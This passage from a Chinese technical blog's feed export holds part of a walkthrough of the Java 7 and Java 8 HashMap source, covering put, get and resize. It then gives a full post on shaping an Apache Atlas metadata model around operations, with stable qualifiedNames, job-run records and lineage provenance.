<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void inflateTable(int toSize) &#123;</span><br><span class="line">    // 保证数组大小一定是 2 的 n 次方。</span><br><span class="line">    // 比如这样初始化：new HashMap(20)，那么处理成初始数组大小是 32</span><br><span class="line">    int capacity = roundUpToPowerOf2(toSize);</span><br><span class="line">    // 计算扩容阈值：capacity * loadFactor</span><br><span class="line">    threshold = (int) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + 1);</span><br><span class="line">    // 算是初始化数组吧</span><br><span class="line">    table = new Entry[capacity];</span><br><span class="line">    initHashSeedAsNeeded(capacity); //ignore</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一个将数组大小保持为 2 的 n 次方的做法，Java7 和 Java8 的 HashMap 和 ConcurrentHashMap 都有相应的要求，只不过实现的代码稍微有些不同，后面再看到的时候就知道了。</p>
<h3 id="计算具体数组位置（indexFor）"><a href="#计算具体数组位置（indexFor）" class="headerlink" title="计算具体数组位置（indexFor）"></a>计算具体数组位置（indexFor）</h3><p>这个简单，我们自己也能 YY 一个：使用 key 的 hash 值对数组长度进行取模就可以了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static int indexFor(int hash, int length) &#123;</span><br><span class="line">    // assert Integer.bitCount(length) == 1 : &quot;length must be a non-zero power of 2&quot;;</span><br><span class="line">    return hash &amp; (length-1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法很简单，简单说就是取 hash 值的低 n 位。如在数组长度为 32 的时候，其实取的就是 key 的 hash 值的低 5 位，作为它在数组中的下标位置。</p>
<h3 id="添加节点到链表中（addEntry）"><a href="#添加节点到链表中（addEntry）" class="headerlink" title="添加节点到链表中（addEntry）"></a>添加节点到链表中（addEntry）</h3><p>找到数组下标后，会先进行 key 判重，如果没有重复，就准备将新值放入到链表的表头。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void addEntry(int hash, K key, V value, int bucketIndex) &#123;</span><br><span class="line">    // 如果当前 HashMap 大小已经达到了阈值，并且新值要插入的数组位置已经有元素了，那么要扩容</span><br><span class="line">    if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123;</span><br><span class="line">        // 扩容，后面会介绍一下</span><br><span class="line">        resize(2 * table.length);</span><br><span class="line">        // 扩容以后，重新计算 hash 值</span><br><span class="line">        hash = (null != key) ? hash(key) : 0;</span><br><span class="line">        // 重新计算扩容后的新的下标</span><br><span class="line">        bucketIndex = indexFor(hash, table.length);</span><br><span class="line">    &#125;</span><br><span class="line">    // 往下看</span><br><span class="line">    createEntry(hash, key, value, bucketIndex);</span><br><span class="line">&#125;</span><br><span class="line">// 这个很简单，其实就是将新值放到链表的表头，然后 size++</span><br><span class="line">void createEntry(int hash, K key, V value, int bucketIndex) &#123;</span><br><span class="line">    Entry&lt;K,V&gt; e = table[bucketIndex];</span><br><span class="line">    table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法的主要逻辑就是先判断是否需要扩容，需要的话先扩容，然后再将这个新的数据插入到扩容后的数组的相应位置处的链表的表头。</p>
<h3 id="数组扩容（resize）"><a href="#数组扩容（resize）" class="headerlink" title="数组扩容（resize）"></a>数组扩容（resize）</h3><p>前面我们看到，在插入新值的时候，如果当前的 size 已经达到了阈值，并且要插入的数组位置上已经有元素，那么就会触发扩容，扩容后，数组大小为原来的 2 倍。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void resize(int newCapacity) &#123;</span><br><span class="line">    Entry[] oldTable = table;</span><br><span class="line">    int oldCapacity = oldTable.length;</span><br><span class="line">    if (oldCapacity == MAXIMUM_CAPACITY) &#123;</span><br><span class="line">        threshold = Integer.MAX_VALUE;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    // 新的数组</span><br><span class="line">    Entry[] newTable = new Entry[newCapacity];</span><br><span class="line">    // 将原来数组中的值迁移到新的更大的数组中</span><br><span class="line">    transfer(newTable, initHashSeedAsNeeded(newCapacity));</span><br><span class="line">    table = newTable;</span><br><span class="line">    threshold = (int)Math.min(newCapacity * loadFactor, MAXIMUM_CAPACITY + 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>扩容就是用一个新的大数组替换原来的小数组，并将原来数组中的值迁移到新的数组中。</p>
<p>由于是双倍扩容，迁移过程中，会将原来 table[i] 中的链表的所有节点，分拆到新的数组的 newTable[i]和 newTable[i + oldLength] 位置上。如原来数组长度是 16，那么扩容后，原来 table[0] 处的链表中的所有元素会被分配到新数组中 newTable[0] 和 newTable[16] 这两个位置。代码比较简单，这里就不展开了。</p>
<h3 id="get-过程分析"><a href="#get-过程分析" class="headerlink" title="get 过程分析"></a>get 过程分析</h3><p>相对于 put 过程，get 过程是非常简单的。</p>
<p>根据 key 计算 hash 值。<br>找到相应的数组下标：hash &amp; (length - 1)。<br>遍历该数组位置处的链表，直到找到相等(&#x3D;&#x3D;或equals)的 key。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public V get(Object key) &#123;</span><br><span class="line">    // 之前说过，key 为 null 的话，会被放到 table[0]，所以只要遍历下 table[0] 处的链表就可以了</span><br><span class="line">    if (key == null)</span><br><span class="line">        return getForNullKey();</span><br><span class="line">    //</span><br><span class="line">    Entry&lt;K,V&gt; entry = getEntry(key);</span><br><span class="line"></span><br><span class="line">    return null == entry ? null : entry.getValue();</span><br><span class="line">&#125;</span><br><span class="line">getEntry(key):</span><br><span class="line">final Entry&lt;K,V&gt; getEntry(Object key) &#123;</span><br><span class="line">    if (size == 0) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int hash = (key == null) ? 0 : hash(key);</span><br><span class="line">    // 确定数组下标，然后从头开始遍历链表，直到找到为止</span><br><span class="line">    for (Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];</span><br><span class="line">         e != null;</span><br><span class="line">         e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        if (e.hash == hash &amp;&amp;</span><br><span class="line">            ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class="line">            return e;</span><br><span class="line">    &#125;</span><br><span class="line">     return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Java8-中-HashMap"><a href="#Java8-中-HashMap" class="headerlink" title="Java8 中 HashMap"></a>Java8 中 HashMap</h3><p>Java8 对 HashMap 进行了一些修改，最大的不同就是利用了红黑树，所以其由 数组+链表+红黑树 组成。</p>
<p>根据 Java7 HashMap 的介绍，我们知道，查找的时候，根据 hash 值我们能够快速定位到数组的具体下标，但是之后的话，需要顺着链表一个个比较下去才能找到我们需要的，时间复杂度取决于链表的长度，为 O(n)。</p>
<p>为了降低这部分的开销，在 Java8 中，当链表中的元素达到了 8 个时，会将链表转换为红黑树，在这些位置进行查找的时候可以降低时间复杂度为 O(logN)。</p>
<p>来一张图简单示意一下吧：\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1586586239096.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 3 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>注意，上图是示意图，主要是描述结构，不会达到这个状态的，因为这么多数据的时候早就扩容了。</p>
<p>下面，我们还是用代码来介绍吧，个人感觉，Java8 的源码可读性要差一些，不过精简一些。</p>
<p>Java7 中使用 Entry 来代表每个 HashMap 中的数据节点，Java8 中使用 Node，基本没有区别，都是 key，value，hash 和 next 这四个属性，不过，Node 只能用于链表的情况，红黑树的情况需要使用 TreeNode。</p>
<p>我们根据数组元素中，第一个节点数据类型是 Node 还是 TreeNode 来判断该位置下是链表还是红黑树的。</p>
<h3 id="put-过程分析-1"><a href="#put-过程分析-1" class="headerlink" title="put 过程分析"></a>put 过程分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;&#x2F; 第三个参数 onlyIfAbsent 如果是 true，那么只有在不存在该 key 时才会进行 put 操作<br>&#x2F;&#x2F; 第四个参数 evict 我们这里不关心</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class="line">               boolean evict) &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span><br><span class="line">    // 第一次 put 值的时候，会触发下面的 resize()，类似 java7 的第一次 put 也要初始化数组长度</span><br><span class="line">    // 第一次 resize 和后续的扩容有些不一样，因为这次是数组从 null 初始化到默认的 16 或自定义的初始容量</span><br><span class="line">    if ((tab = table) == null || (n = tab.length) == 0)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    // 找到具体的数组下标，如果此位置没有值，那么直接初始化一下 Node 并放置在这个位置就可以了</span><br><span class="line">    if ((p = tab[i = (n - 1) &amp; hash]) == null)</span><br><span class="line">        tab[i] = newNode(hash, key, value, null);</span><br><span class="line"></span><br><span class="line">    else &#123;// 数组该位置有数据</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        // 首先，判断该位置的第一个数据和我们要插入的数据，key 是不是&quot;相等&quot;，如果是，取出这个节点</span><br><span class="line">        if (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        // 如果该节点是代表红黑树的节点，调用红黑树的插值方法，本文不展开说红黑树</span><br><span class="line">        else if (p instanceof TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);</span><br><span class="line">        else &#123;</span><br><span class="line">            // 到这里，说明数组该位置上是一个链表</span><br><span class="line">            for (int binCount = 0; ; ++binCount) &#123;</span><br><span class="line">                // 插入到链表的最后面(Java7 是插入到链表的最前面)</span><br><span class="line">                if ((e = p.next) == null) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, null);</span><br><span class="line">                    // TREEIFY_THRESHOLD 为 8，所以，如果新插入的值是链表中的第 8 个</span><br><span class="line">                    // 会触发下面的 treeifyBin，也就是将链表转换为红黑树</span><br><span class="line">                    if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st</span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                // 如果在该链表中找到了&quot;相等&quot;的 key(== 或 equals)</span><br><span class="line">                if (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class="line">                    // 此时 break，那么 e 为链表中[与要插入的新值的 key &quot;相等&quot;]的 node</span><br><span class="line">                    break;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // e!=null 说明存在旧值的key与要插入的key&quot;相等&quot;</span><br><span class="line">        // 对于我们分析的put操作，下面这个 if 其实就是进行 &quot;值覆盖&quot;，然后返回旧值</span><br><span class="line">        if (e != null) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            if (!onlyIfAbsent || oldValue == null)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            return oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    // 如果 HashMap 由于新插入这个值导致 size 已经超过了阈值，需要进行扩容</span><br><span class="line">    if (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和 Java7 稍微有点不一样的地方就是，Java7 是先扩容后插入新值的，Java8 先插值再扩容，不过这个不重要。</p>
<h3 id="数组扩容"><a href="#数组扩容" class="headerlink" title="数组扩容"></a>数组扩容</h3><p>resize() 方法用于初始化数组或数组扩容，每次扩容后，容量为原来的 2 倍，并进行数据迁移。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">final Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">    int oldCap = (oldTab == null) ? 0 : oldTab.length;</span><br><span class="line">    int oldThr = threshold;</span><br><span class="line">    int newCap, newThr = 0;</span><br><span class="line">    if (oldCap &gt; 0) &#123; // 对应数组扩容</span><br><span class="line">        if (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">            return oldTab;</span><br><span class="line">        &#125;</span><br><span class="line">        // 将数组大小扩大一倍</span><br><span class="line">        else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">            // 将阈值扩大一倍</span><br><span class="line">            newThr = oldThr &lt;&lt; 1; // double threshold</span><br><span class="line">    &#125;</span><br><span class="line">    else if (oldThr &gt; 0) // 对应使用 new HashMap(int initialCapacity) 初始化后，第一次 put 的时候</span><br><span class="line">        newCap = oldThr;</span><br><span class="line">    else &#123;// 对应使用 new HashMap() 初始化后，第一次 put 的时候</span><br><span class="line">        newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">        newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (newThr == 0) &#123;</span><br><span class="line">        float ft = (float)newCap * loadFactor;</span><br><span class="line">        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ?</span><br><span class="line">                  (int)ft : Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    threshold = newThr;</span><br><span class="line"></span><br><span class="line">    // 用新的数组大小初始化新的数组</span><br><span class="line">    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap];</span><br><span class="line">    table = newTab; // 如果是初始化数组，到这里就结束了，返回 newTab 即可</span><br><span class="line"></span><br><span class="line">    if (oldTab != null) &#123;</span><br><span class="line">        // 开始遍历原数组，进行数据迁移。</span><br><span class="line">        for (int j = 0; j &lt; oldCap; ++j) &#123;</span><br><span class="line">            Node&lt;K,V&gt; e;</span><br><span class="line">            if ((e = oldTab[j]) != null) &#123;</span><br><span class="line">                oldTab[j] = null;</span><br><span class="line">                // 如果该数组位置上只有单个元素，那就简单了，简单迁移这个元素就可以了</span><br><span class="line">                if (e.next == null)</span><br><span class="line">                    newTab[e.hash &amp; (newCap - 1)] = e;</span><br><span class="line">                // 如果是红黑树，具体我们就不展开了</span><br><span class="line">                else if (e instanceof TreeNode)</span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap);</span><br><span class="line">                else &#123;</span><br><span class="line">                    // 这块是处理链表的情况，</span><br><span class="line">                    // 需要将此链表拆成两个链表，放到新的数组中，并且保留原来的先后顺序</span><br><span class="line">                    // loHead、loTail 对应一条链表，hiHead、hiTail 对应另一条链表，代码还是比较简单的</span><br><span class="line">                    Node&lt;K,V&gt; loHead = null, loTail = null;</span><br><span class="line">                    Node&lt;K,V&gt; hiHead = null, hiTail = null;</span><br><span class="line">                    Node&lt;K,V&gt; next;</span><br><span class="line">                    do &#123;</span><br><span class="line">                        next = e.next;</span><br><span class="line">                        if ((e.hash &amp; oldCap) == 0) &#123;</span><br><span class="line">                            if (loTail == null)</span><br><span class="line">                                loHead = e;</span><br><span class="line">                            else</span><br><span class="line">                                loTail.next = e;</span><br><span class="line">                            loTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                        else &#123;</span><br><span class="line">                            if (hiTail == null)</span><br><span class="line">                                hiHead = e;</span><br><span class="line">                            else</span><br><span class="line">                                hiTail.next = e;</span><br><span class="line">                            hiTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; while ((e = next) != null);</span><br><span class="line">                    if (loTail != null) &#123;</span><br><span class="line">                        loTail.next = null;</span><br><span class="line">                        // 第一条链表</span><br><span class="line">                        newTab[j] = loHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (hiTail != null) &#123;</span><br><span class="line">                        hiTail.next = null;</span><br><span class="line">                        // 第二条链表的新的位置是 j + oldCap，这个很好理解</span><br><span class="line">                        newTab[j + oldCap] = hiHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return newTab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="get-过程分析-1"><a href="#get-过程分析-1" class="headerlink" title="get 过程分析"></a>get 过程分析</h3><p>相对于 put 来说，get 真的太简单了。</p>
<p>计算 key 的 hash 值，根据 hash 值找到对应数组下标: hash &amp; (length-1).<br>判断数组该位置处的元素是否刚好就是我们要找的，如果不是，走第三步.<br>判断该元素类型是否是 TreeNode，如果是，用红黑树的方法取数据，如果不是，走第四步.<br>遍历链表，直到找到相等(&#x3D;&#x3D;或equals)的 key.</p>
<pre><code>public V get(Object key) {
    Node&lt;K,V&gt; e;
    return (e = getNode(hash(key), key)) == null ? null : e.value;
}
final Node&lt;K,V&gt; getNode(int hash, Object key) {
    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k;
    if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp;
        (first = tab[(n - 1) &amp; hash]) != null) {
        // 判断第一个节点是不是就是需要的
        if (first.hash == hash &amp;&amp; // always check first node
            ((k = first.key) == key || (key != null &amp;&amp; key.equals(k))))
            return first;
        if ((e = first.next) != null) {
            // 判断是否是红黑树
            if (first instanceof TreeNode)
                return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);

            // 链表遍历
            do {
                if (e.hash == hash &amp;&amp;
                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))
                    return e;
            } while ((e = e.next) != null);
        }
    }
    return null;
}
</code></pre>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>源码</tag>
        <tag>hashmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Atlas 元数据怎么先服务运维：从 qualifiedName 到运行实例</title>
    <url>//2020/12/24/metadata-for-operations-first/</url>
    <content><![CDATA[<p>做元数据平台时，很容易先把精力花在资产目录、业务术语和页面分类上。界面做得很完整，任务失败时却还是有人在群里问：这张表谁负责，今天是哪段代码写的，改字段会影响哪些任务？</p>
<p>我更愿意从这些运维问题反推元数据模型。它们有明确答案，也能用一次真实故障检验。平台先把表、任务、实例和运行证据串起来，资产目录才不会只剩一棵需要人工维护的树。</p>
<p>下面用 Apache Atlas 2.1.0 的源码模型做参照。对应提交是 <code>da35519</code>，打包时间在 2020 年 7 月。Atlas 已经提供了实体唯一标识、Process 输入输出、实体变更审计和血缘查询；运行实例仍需要平台自己建模。</p>
<p class="article-diagram-scroll"><img src="/images/articles/metadata-operations-evidence.svg" class="lazyload" data-srcset="/images/articles/metadata-operations-evidence.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="面向运维的元数据与运行证据模型"></p>
<span id="more"></span>

<h2 id="先让对象有稳定身份"><a href="#先让对象有稳定身份" class="headerlink" title="先让对象有稳定身份"></a>先让对象有稳定身份</h2><p>Atlas 基础模型里，<code>Referenceable</code> 只有一个属性：<code>qualifiedName</code>。这个字段必填、建立索引，并且全局唯一。<code>Asset</code> 继承它以后，再增加 <code>name</code>、<code>description</code>、<code>owner</code> 等属性。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qualifiedName&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typeName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;isIndexable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;isOptional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;isUnique&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这比页面展示名重要。两个集群都可能有 <code>ods.order_info</code>，任务迁移后名称也可能不变。如果只拿库名、表名做主键，测试和生产很快会撞在一起。</p>
<p>我通常把环境和数据源实例写进 <code>qualifiedName</code>：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hive://prod-cluster/ods/order_info</span><br><span class="line">mysql://crm-prod/customer/customer_profile</span><br><span class="line">job://prod/datax/order_mysql_to_hive</span><br></pre></td></tr></table></figure>

<p>格式本身不是标准，稳定才是要求。采集器升级、页面改名、Atlas 内部 GUID 变化，都不应该让同一个业务对象变成新资产。Atlas 的实体接口支持通过类型加唯一属性查询，血缘接口也可以通过 <code>typeName + qualifiedName</code> 找到实体，这正好适合外部平台保存自己的稳定标识。</p>
<p>如果对象身份没有先定下来，后面所有血缘、负责人和告警关联都会变成模糊匹配。元数据重复往往不是清理脚本没写好，而是最开始就没有定义“同一个对象”是什么意思。</p>
<h2 id="Process-能表达依赖，表达不了一次运行"><a href="#Process-能表达依赖，表达不了一次运行" class="headerlink" title="Process 能表达依赖，表达不了一次运行"></a><code>Process</code> 能表达依赖，表达不了一次运行</h2><p>Atlas 基础模型把数据对象抽象成 <code>DataSet</code>，把加工过程抽象成 <code>Process</code>。<code>Process</code> 有 <code>inputs</code> 和 <code>outputs</code> 两组 <code>DataSet</code> 关系：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">orders_raw ----&gt; datax_order_sync ----&gt; ods_orders</span><br><span class="line">  DataSet              Process            DataSet</span><br></pre></td></tr></table></figure>

<p>这足够表达设计态血缘：某个任务通常读哪些表、写哪些表。运维现场还缺一个对象，即“这一次运行”。</p>
<p>任务定义和任务实例不能混用。定义回答的是代码与调度配置，实例回答的是某个时间点究竟运行了什么。我会在 Atlas 模型外扩展一个 <code>JobRun</code>，至少保留这些字段：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">runId</span><br><span class="line">jobQualifiedName</span><br><span class="line">scheduledTime / startTime / endTime</span><br><span class="line">state</span><br><span class="line">codeVersion</span><br><span class="line">configVersion</span><br><span class="line">engineApplicationId</span><br><span class="line">logUri</span><br></pre></td></tr></table></figure>

<p><code>JobRun</code> 关联当时的 Job 定义、代码版本和配置快照，再记录本次实际读写的数据对象。这样才能区分两类很像的问题：代码定义已经改成读新表，但凌晨失败的实例仍然运行旧版本；页面只展示最新任务配置时，这个差异会被抹掉。</p>
<p>实例对象也不该无限塞进 Atlas 主图。高频实例会让图存储和搜索索引迅速膨胀。我的做法是 Atlas 保存任务定义、资产和稳定关系，实例明细进入运行库；Atlas 上只挂最近一次状态、实例入口和需要长期留存的变更证据。影响分析走 Atlas，故障时间线走运行库，两边用同一个 <code>qualifiedName</code> 和 <code>runId</code> 对齐。</p>
<h2 id="设计态血缘和运行态血缘要分开"><a href="#设计态血缘和运行态血缘要分开" class="headerlink" title="设计态血缘和运行态血缘要分开"></a>设计态血缘和运行态血缘要分开</h2><p>SQL 解析能告诉我们一段代码可能读写哪些表。动态分区、条件分支、存储过程和运行参数加入以后，“可能”与“本次实际发生”会出现差异。</p>
<p>我会给血缘边保留来源：</p>
<table>
<thead>
<tr>
<th>血缘来源</th>
<th>它能说明什么</th>
<th>不能直接说明什么</th>
</tr>
</thead>
<tbody><tr>
<td>SQL 静态解析</td>
<td>当前代码可识别的输入输出</td>
<td>本次实例是否走到该分支</td>
</tr>
<tr>
<td>引擎执行计划</td>
<td>提交时引擎准备访问的对象</td>
<td>任务是否成功提交数据</td>
</tr>
<tr>
<td>Hook 或运行事件</td>
<td>某次执行实际观察到的读写</td>
<td>未被 Hook 覆盖的外部动作</td>
</tr>
<tr>
<td>人工维护</td>
<td>暂时无法自动采集的业务关系</td>
<td>关系是否一直保持最新</td>
</tr>
</tbody></table>
<p>这四类边可以同时存在，但不能合成一条没有来源的线。否则影响分析只能回答“图上连着”，回答不了这条关系由谁采集、何时有效、失败实例是否真的写出了数据。</p>
<p>Atlas 的 <code>LineageREST</code> 支持按 GUID 查询，也支持按唯一属性查询；方向可以选 <code>INPUT</code>、<code>OUTPUT</code> 或 <code>BOTH</code>，默认深度是 3。接口解决的是图怎么取，可信度仍取决于我们写进图里的关系有没有证据。</p>
<h2 id="实体审计只能证明元数据发生过变化"><a href="#实体审计只能证明元数据发生过变化" class="headerlink" title="实体审计只能证明元数据发生过变化"></a>实体审计只能证明元数据发生过变化</h2><p>Atlas 的 Entity REST 提供 <code>/{guid}/audit</code>，可以按实体读取审计事件。它适合回答表负责人、分类或实体属性在什么时候被谁修改。</p>
<p>这类审计不能替代任务运行日志。实体的 <code>updateTime</code> 变化，只能证明 Atlas 中的对象更新过，不能证明源数据库那一刻真的完成了 DDL；一条 Process 血缘被创建，也不能证明任务成功跑过。</p>
<p>因此每次采集我都会多留三项：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">source       = hive-hook / scheduler / sql-parser / manual</span><br><span class="line">observedAt   = 2020-12-24T10:56:31+08:00</span><br><span class="line">sourceRef    = event-id / run-id / parser-version</span><br></pre></td></tr></table></figure>

<p>遇到冲突时，先按来源与时间判断。比如 Hive Hook 在实例运行时采集到旧字段，而定时采集器十分钟后读到新结构，两份数据都可能是真的，只是观察窗口不同。直接用后写覆盖前写，会把故障现场清掉。</p>
<h2 id="一条失败任务需要哪些元数据"><a href="#一条失败任务需要哪些元数据" class="headerlink" title="一条失败任务需要哪些元数据"></a>一条失败任务需要哪些元数据</h2><p>假设同步任务 <code>order_mysql_to_hive</code> 在凌晨失败，我希望平台能从实例页直接得到下面这条链路：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">失败实例 runId</span><br><span class="line">  -&gt; 任务定义与代码版本</span><br><span class="line">  -&gt; 本次配置快照</span><br><span class="line">  -&gt; 源表和目标表的 qualifiedName</span><br><span class="line">  -&gt; 引擎 applicationId 与原始日志</span><br><span class="line">  -&gt; 上次成功实例</span><br><span class="line">  -&gt; 下游任务和负责人</span><br></pre></td></tr></table></figure>

<p>有了这条链路，很多动作可以自动完成：确认失败前是否刚发布过代码，比较本次与上次成功实例的配置差异，查询目标表的下游影响，再把日志范围缩到对应引擎应用。</p>
<p>如果平台只能查到“这张表属于订单域”，它对治理汇报有用，对凌晨故障帮助有限。反过来，运维链路建立后，负责人、描述、分类和业务术语都有稳定对象可以挂载，资产建设反而更顺。</p>
<p>我会按以下顺序落地：先统一表与任务的 <code>qualifiedName</code>；再接任务发布和实例事件，让代码、配置、日志能回到一次运行；随后补表级设计态与运行态血缘；字段级血缘等 SQL 解析覆盖率和证据标记稳定以后再做。</p>
<p>这不是降低数据治理目标，而是先选择一条能被真实问题验收的路径。一次故障能否还原，比目录里录入了多少条描述更能说明元数据平台是否可靠。</p>
<h2 id="源码与接口依据"><a href="#源码与接口依据" class="headerlink" title="源码与接口依据"></a>源码与接口依据</h2><ul>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/addons/models/0000-Area0/0010-base_model.json#L34-L198"><code>0010-base_model.json</code>：Referenceable、Asset、DataSet 与 Process</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/webapp/src/main/java/org/apache/atlas/web/rest/EntityREST.java#L335-L355"><code>EntityREST.createOrUpdate()</code>：创建或更新实体</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/webapp/src/main/java/org/apache/atlas/web/rest/EntityREST.java#L794-L846"><code>EntityREST.getAuditEvents()</code>：实体审计事件</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/webapp/src/main/java/org/apache/atlas/web/rest/LineageREST.java#L79-L109"><code>LineageREST.getLineageGraph()</code>：按 GUID 查询血缘</a></li>
<li><a href="https://github.com/apache/atlas/blob/da3551938deceaf714f80ec8c0927161646cb8bb/webapp/src/main/java/org/apache/atlas/web/rest/LineageREST.java#L111-L151"><code>LineageREST.getLineageByUniqueAttribute()</code>：按 qualifiedName 等唯一属性查询</a></li>
</ul>
]]></content>
      <categories>
        <category>数据治理</category>
      </categories>
      <tags>
        <tag>Apache Atlas</tag>
        <tag>元数据</tag>
        <tag>数据血缘</tag>
      </tags>
  </entry>
  <entry>
    <title>DataX 脏数据阈值的反直觉细节：record 和 percentage 不会同时生效</title>
    <url>//2021/01/07/datax-dirty-data-contract/</url>
